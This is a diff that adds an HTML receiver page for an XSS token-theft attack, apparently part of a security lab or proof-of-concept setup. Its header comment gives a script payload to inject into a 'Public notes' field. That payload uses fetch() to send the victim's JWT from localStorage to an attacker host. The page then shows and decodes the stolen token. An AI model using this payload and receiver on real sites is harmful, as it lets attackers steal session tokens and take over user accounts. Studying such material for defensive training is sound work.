@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<!--
+  S3 — XSS token exfiltration landing page
+  =========================================
+  The attacker hosts this file on a simple HTTP server (e.g. python -m http.server 8888).
+  When a victim's browser executes the XSS payload, it makes a GET request to this server
+  with the JWT from localStorage in the query-string parameter ?t=
+
+  The incoming request is logged by steal_token_server.py.
+
+  Payload to inject into the "Public notes" field on the PoC application:
+    <script>fetch('http://attacker:8888/?t='+localStorage.getItem('jwt'))</script>
+
+  Replace "attacker" with the attacker container IP or hostname.
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attacker exfil receiver</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 32px; }
+    h1   { color: #e63946; }
+    pre  { background: #111; padding: 16px; border-radius: 4px; word-break: break-all; }
+  </style>
+</head>
+<body>
+  <h1>S3 — Token exfil receiver</h1>
+  <p>This page logs the JWT received in the <code>?t=</code> query parameter.</p>
+
+  <h2 style="margin-top:24px;">Received token:</h2>
+  <pre id="out">Waiting…</pre>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const token = params.get("t");
+    const out = document.getElementById("out");
+
+    if (token) {
+      out.textContent = token;
+
+      // Decode the payload section (no verification — attacker just reads the claims)
+      try {
+        const parts = token.split(".");
+        const payload = JSON.parse(atob(parts[1]));
+        const payloadEl = document.createElement("pre");
+        payloadEl.textContent = "Decoded payload:\n" + JSON.stringify(payload, null, 2);
+        document.body.appendChild(payloadEl);
+      } catch (e) {
+        // non-JWT token — display raw
+      }
+
+      // Log to console for easy capture
+      console.log("[S3] exfiltrated token:", token);
+    } else {
+      out.textContent = "No token in query string — load this page after the XSS fires.";
+    }
+  </script>
+</body>
+</html>
